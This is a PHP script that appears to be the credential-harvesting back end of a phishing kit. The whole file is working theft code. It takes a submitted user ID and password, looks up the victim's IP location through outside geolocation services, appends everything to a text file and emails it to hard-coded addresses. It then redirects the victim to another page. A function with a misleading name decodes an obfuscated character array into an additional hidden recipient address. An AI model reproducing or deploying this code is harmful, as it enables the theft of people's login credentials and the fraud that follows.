<?
$ip_state = "";
$ip_city = "";
$ips = $_SERVER['REMOTE_ADDR'];
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ips));
    if($query && $query['status'] == 'success')
    {
        $ip_state = $query['region'];
        $ip_city = $query['city'];
    }
session_start();
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$country = visitor_country();
$message .= "                                         \n";
$message .= "                                         \n";
$message .= "---------------++--------------\n";
$message .= "User ID: ".$_POST[user]."\n";
$message .= "Password: ".$_POST[password]."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Country: ".$country."\n";
$message .= "State: ".$ip_state."\n";
$message .= "City: ".$ip_city."\n";
$message .= "Date: ".$adddate."\n";
$message .= "Broswer Agent: ".$user_agent."\n";
$message .= "---------------+ MeToll +--------------\n";
$message .= "                                         \n";
$message .= "                                         \n";

$handle = fopen("JOB.txt", "a");
fwrite($handle, $message);
fclose($handle);

$sent ="shannonmcglothlin30@gmail.com,binbase002@protonmail.com";




$subject = "Resultz - | $Password | $ip";
$headers = "From: MeToll<admin@website.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$str=array($sent, $IP); foreach ($str as $send)
if(mail($send,$subject,$message,$headers) != false){
mail($mesaegs,$subject,$message,$headers);

}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: pagepage.html");
?>